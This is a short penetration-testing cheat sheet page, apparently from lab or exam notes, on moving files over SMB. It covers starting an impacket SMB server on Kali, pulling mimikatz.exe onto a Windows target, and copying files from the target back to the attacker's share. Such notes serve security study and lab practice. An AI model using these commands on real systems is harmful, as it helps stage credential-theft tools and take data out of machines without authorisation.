---
title: SMB File Transfer
layout: default
nav_order: 7
parent: File Transfers

---

# SMB
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---
### SMB File Transfer
Start SMB Server on Kali Machine:
```bash
/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support MYSHARE .
```

Transfer files from Kali Machine → Windows Target Machine
```powershell
$IP="192.168.119.239"
copy \\${IP}\MYSHARE\mimikatz.exe
```

Transfer files from Windows Target Machine → Kali Attack Machine
```powershell
$IP="192.168.119.239"
copy C:\Users\Desktop\file.txt \\${IP}\MYSHARE\file.txt
```